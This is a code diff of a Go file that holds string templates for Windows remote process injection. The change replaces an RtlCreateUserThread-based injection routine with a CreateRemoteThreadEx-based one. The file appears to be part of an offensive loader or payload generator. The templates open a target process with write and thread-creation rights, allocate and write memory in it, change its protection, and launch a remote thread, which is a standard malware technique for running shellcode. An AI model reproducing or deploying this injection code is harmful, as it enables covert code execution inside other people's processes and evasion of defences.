@@ -1,36 +1,36 @@
 package remote
 
-const RtlCreateUserThreadImports = `
+const CreateRemoteThreadDlls = `
+
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+
+	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
+
+	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
+
+`
+const CreateRemoteThreadImports = `
 	"fmt"
 	"log"
-	"os"
+	
 	"strconv"
-	"time"
+	
 	"unsafe"
 
-	"github.com/salukikit/go-util/pkg/box"
+	
 
 	// Sub Repositories
 
 	"golang.org/x/sys/windows"
+
 `
+const CreateRemoteThread = `
+pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
 
-const RtlCreateUserThreadDlls = `
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-
-	OpenProcess := kernel32.NewProc("OpenProcess")
-	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
-	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
-	CloseHandle := kernel32.NewProc("CloseHandle")
-`
-
-const RtlCreateUserThread = `
-	pHandle, _, errOpenProcess := OpenProcess.Call(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, uintptr(uint32(pid)))
-
-	if errOpenProcess != nil && errOpenProcess.Error() != "The operation completed successfully." {
+	if errOpenProcess != nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
 	}
 
@@ -56,15 +56,14 @@ const RtlCreateUserThread = `
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
 	}
 
-	var tHandle uintptr
-	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
-
-	if errRtlCreateUserThread != nil && errRtlCreateUserThread.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling RtlCreateUserThread:\r\n%s", errRtlCreateUserThread.Error()))
+	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
+	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
 	}
 
-	_, _, errCloseHandle := CloseHandle.Call(uintptr(uint32(pHandle)))
-	if errCloseHandle != nil && errCloseHandle.Error() != "The operation completed successfully." {
+	errCloseHandle := windows.CloseHandle(pHandle)
+	if errCloseHandle != nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
 	}
+
 `
